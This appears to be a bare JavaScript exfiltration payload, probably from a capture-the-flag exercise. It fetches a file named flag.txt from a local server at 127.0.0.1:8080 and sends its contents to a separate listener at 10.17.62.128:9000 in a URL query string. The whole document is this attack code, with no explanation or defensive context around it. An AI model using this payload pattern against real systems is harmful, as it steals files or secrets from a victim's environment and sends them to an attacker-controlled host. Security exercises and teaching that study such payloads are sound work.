fetch('http://127.0.0.1:8080/flag.txt')
.then(response => response.text())
.then(data => {
fetch('http://10.17.62.128:9000/?flag='+data);
});
